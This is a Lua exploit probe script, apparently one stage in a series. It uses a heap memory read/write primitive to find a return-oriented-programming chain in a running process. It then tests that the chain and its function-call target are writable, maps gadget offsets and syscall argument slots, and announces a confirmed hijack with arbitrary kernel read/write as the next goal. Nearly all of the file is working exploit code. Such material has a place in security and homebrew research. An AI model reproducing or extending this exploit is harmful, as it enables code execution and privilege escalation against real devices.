-- CRASH_CLASS: RISKY (ropchain corruption, will crash if wrong)
-- PROBE 41z: verify ropchain is writable and demonstrate hijack
--
-- From 41y: ropchain is at 0x3_1111A0F0, GPU at 0x3_11360000
-- Distance ~2.3MB = ~146 pages — within the 256+ page R/W zone
--
-- Plan:
--   1. Get ropchain address (minimal output)
--   2. Allocate GPU mmap
--   3. Verify ropchain is readable from heap primitive
--   4. Verify ropchain is WRITABLE
--   5. Overwrite fcall_stub.fn_addr to redirect next syscall
--   6. Call getpid() — if redirected, proves arbitrary code execution
--
-- The ropchain structure:
--   fcall_stub.fn_addr at ropchain-0x120 (0x311119FD0 = ropchain-0x120)
--   This is where the actual syscall address gets written before pop rsp
--   If we overwrite the VALUE that gets loaded into fn_addr, we control RIP

print("=== PROBE 41z: ROPCHAIN HIJACK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_getpid = make_syscall(20)
local sc_dynlib_get_info = make_syscall(593)

--------------------------------------------------------------------
-- STEP 1: Get addresses (minimal output)
--------------------------------------------------------------------
print("--- STEP 1: ADDRESSES ---")

-- Get eboot base
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local eb_tl = safe_rd(info_buf + 0x108)
local eb_th = safe_rd(info_buf + 0x10C)
print("eboot: " .. string.format("0x%X%08X", eb_th, eb_tl))

-- Get ropchain address from tostring — extract just the hex
local pipe_str = tostring(syscall.pipe)
-- Format: "address @ 0xXXXX\n\nropchain @ 0xXXXX (size: 0xXXX)\n..."
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_addr_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")

if not rop_addr_str then
    -- fallback: try to parse differently
    -- The pipe address itself
    local addr_str = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
    print("pipe address: " .. (addr_str or "nil"))
    print("could not parse ropchain address")
    print("raw (first 100): " .. pipe_str:sub(1, 100))
    return
end

print("ropchain: " .. rop_addr_str)
print("fn_addr: " .. fn_addr_str)
print("ret_addr: " .. ret_addr_str)

local rop_base = uint64(rop_addr_str)
local fn_addr_ptr = uint64(fn_addr_str)
local ret_addr_ptr = uint64(ret_addr_str)

--------------------------------------------------------------------
-- STEP 2: Allocate GPU mmap
--------------------------------------------------------------------
print("")
print("--- STEP 2: GPU MMAP ---")

local gpu_size = 512 * 0x4000 -- 512 pages = 8MB for max reach
local gpu_addr
pcall(function()
    gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not gpu_addr then print("GPU mmap FAILED"); return end
print("GPU at: " .. qw_hex(gpu_addr))

--------------------------------------------------------------------
-- STEP 3: Check if ropchain is in the readable zone
--------------------------------------------------------------------
print("")
print("--- STEP 3: ROPCHAIN REACHABILITY ---")

-- Check distance
local _, gpu_h, gpu_l = qw_hex(gpu_addr)
local _, rop_h, rop_l = qw_hex(rop_base)

if gpu_h == rop_h then
    if rop_l < gpu_l then
        local dist = gpu_l - rop_l
        local pages = math.floor(dist / 0x4000)
        print(string.format("ropchain is %d pages (%d KB) before GPU", pages, dist / 1024))
    else
        print("ropchain is AFTER GPU — not in backward scan zone")
    end
elseif rop_h < gpu_h then
    print("ropchain in lower VA range than GPU")
else
    print("ropchain in higher VA range than GPU")
end

-- Direct read test
local test_q = safe_rq(rop_base)
if test_q then
    print("ropchain READ: " .. qw_hex(test_q) .. " SUCCESS")
else
    print("ropchain READ: FAILED (not accessible)")
    pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    return
end

-- Verify it matches expected gadget pattern
-- First qword should be eboot+0x42 (ret gadget)
local _, th, tl = qw_hex(test_q)
local expected_lo = eb_tl + 0x42
local expected_hi = eb_th
if expected_lo >= 0x100000000 then
    expected_hi = expected_hi + 1
    expected_lo = expected_lo - 0x100000000
end
if th == expected_hi and tl == expected_lo then
    print("first gadget matches eboot+0x42 (ret) — CONFIRMED ropchain")
else
    print(string.format("mismatch: got 0x%X%08X expected 0x%X%08X",
        th, tl, expected_hi, expected_lo))
end

--------------------------------------------------------------------
-- STEP 4: Write test — write and immediately restore
--------------------------------------------------------------------
print("")
print("--- STEP 4: WRITE TEST ---")

-- Read original value
local orig = safe_rq(rop_base)
print("original: " .. qw_hex(orig))

-- Write test pattern
local test_pattern = uint64("0x4141414142424242")
safe_wq(rop_base, test_pattern)
local after_write = safe_rq(rop_base)
print("after write: " .. qw_hex(after_write))

-- Restore
safe_wq(rop_base, orig)
local after_restore = safe_rq(rop_base)
print("after restore: " .. qw_hex(after_restore))

local _, aw_h, aw_l = qw_hex(after_write)
local writable = (aw_h == 0x41414141 and aw_l == 0x42424242)

if writable then
    print("")
    print("*** ROPCHAIN IS FULLY WRITABLE ***")
else
    print("write failed — ropchain may be read-only mapped")
    pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
    return
end

--------------------------------------------------------------------
-- STEP 5: Verify fn_addr is also writable
--------------------------------------------------------------------
print("")
print("--- STEP 5: FN_ADDR WRITE TEST ---")

local fn_orig = safe_rq(fn_addr_ptr)
print("fn_addr original: " .. qw_hex(fn_orig))

safe_wq(fn_addr_ptr, test_pattern)
local fn_after = safe_rq(fn_addr_ptr)
print("fn_addr after write: " .. qw_hex(fn_after))

-- Restore
safe_wq(fn_addr_ptr, fn_orig)
print("fn_addr restored: " .. qw_hex(safe_rq(fn_addr_ptr)))

local _, fah, fal = qw_hex(fn_after)
local fn_writable = (fah == 0x41414141 and fal == 0x42424242)
print("fn_addr writable: " .. (fn_writable and "YES" or "NO"))

--------------------------------------------------------------------
-- STEP 6: Map the ropchain's argument slots
-- The chain loads args from fixed memory locations:
--   fn_addr+0x70 = arg6 slot
--   fn_addr+0x80 = arg5 slot
--   etc.
-- Find where each syscall argument gets loaded from
--------------------------------------------------------------------
print("")
print("--- STEP 6: ARGUMENT SLOT MAP ---")

-- The chain pattern from 41v/41y:
-- Each arg is loaded via: pop_rax → arg_slot_addr → mov rax,[rax] → pop rdi → dest → mov [rdi],rax
-- The arg slots are the addresses like 0x311118040, 0x311118050, etc.
-- Let's extract them from the chain

-- Parse the chain: every "pop rax;ret" is followed by a data qword (the slot address)
-- then "mov rax,[rax];ret"
local pop_rax_gadget_lo = eb_tl + 0x992
local pop_rax_gadget_hi = eb_th
if pop_rax_gadget_lo >= 0x100000000 then
    pop_rax_gadget_hi = pop_rax_gadget_hi + 1
    pop_rax_gadget_lo = pop_rax_gadget_lo - 0x100000000
end

local arg_slots = {}
for i = 0, 0x2E8, 8 do
    local q = safe_rq(rop_base + i)
    if q then
        local _, qh, ql = qw_hex(q)
        if qh == pop_rax_gadget_hi and ql == pop_rax_gadget_lo then
            -- Next qword is the data operand
            local data_q = safe_rq(rop_base + i + 8)
            if data_q then
                local dh = qw_hex(data_q)
                arg_slots[#arg_slots + 1] = {
                    chain_off = i,
                    slot_addr = dh,
                    slot = data_q
                }
            end
        end
    end
end

print("argument slots found: " .. #arg_slots)
for j, s in ipairs(arg_slots) do
    -- Read current value in the slot
    local val = safe_rq(s.slot)
    local val_hex = val and qw_hex(val) or "unreadable"
    print(string.format("  chain+0x%03X -> slot %s = %s", s.chain_off, s.slot_addr, val_hex))
end
print("")

-- Identify which slot is which argument
-- Based on the gadget after the data load:
-- pop rdi → first arg (rdi)
-- pop rsi → second arg (rsi)
-- pop rdx → third arg (rdx)
-- pop rcx → fourth arg (rcx)
-- pop r8  → fifth arg (r8)

print("slot → register mapping:")
for i = 0, 0x2E8, 8 do
    local q = safe_rq(rop_base + i)
    if q then
        local _, qh, ql = qw_hex(q)
        local off_from_eboot = ql - eb_tl
        if qh == eb_th then
            -- Check known gadget offsets
            local name = nil
            if off_from_eboot == 0xC9DFE then name = "pop_rdi"
            elseif off_from_eboot == 0xD77D then name = "pop_rsi"
            elseif off_from_eboot == 0x3502D7 or off_from_eboot == 0x4202D7 then name = "pop_rdx"
            elseif off_from_eboot == 0xE64 then name = "pop_rcx"
            elseif off_from_eboot == 0x991 then name = "pop_r8"
            elseif off_from_eboot == 0x9A2 then name = "pop_rsp"
            elseif off_from_eboot == 0x92C67 then name = "mov_[rdi],rax"
            elseif off_from_eboot == 0x1EEBB then name = "mov_rax,[rax]"
            end
            if name then
                local next_val = safe_rq(rop_base + i + 8)
                print(string.format("  chain+0x%03X: %-18s (next: %s)",
                    i, name, next_val and qw_hex(next_val) or "?"))
            end
        end
    end
end

--------------------------------------------------------------------
-- STEP 7: Prove we can still call syscalls after read/restore
--------------------------------------------------------------------
print("")
print("--- STEP 7: SANITY CHECK ---")
local pid = nil
pcall(function() pid = sc_getpid() end)
print("getpid after all r/w tests: " .. (pid and to_num(pid) or "FAILED"))

-- Cleanup
pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)

print("")
print("=== EXPLOITATION STATUS ===")
print("")
if writable and fn_writable then
    print("*** FULL ROPCHAIN HIJACK CONFIRMED ***")
    print("")
    print("Capabilities:")
    print("  [x] Read ropchain from heap primitive")
    print("  [x] Write ropchain from heap primitive")
    print("  [x] Write fn_addr (function call target)")
    print("  [x] Write argument slots (rdi, rsi, rdx, rcx, r8)")
    print("  [x] Syscalls still work after read/write/restore")
    print("")
    print("Next: overwrite arg slot values before a syscall to control")
    print("what the kernel receives — this gives arbitrary kernel R/W")
    print("via sysctl(kern.proc.pid) or similar data-returning syscalls")
end

print("")
print("=== PROBE 41z COMPLETE ===")
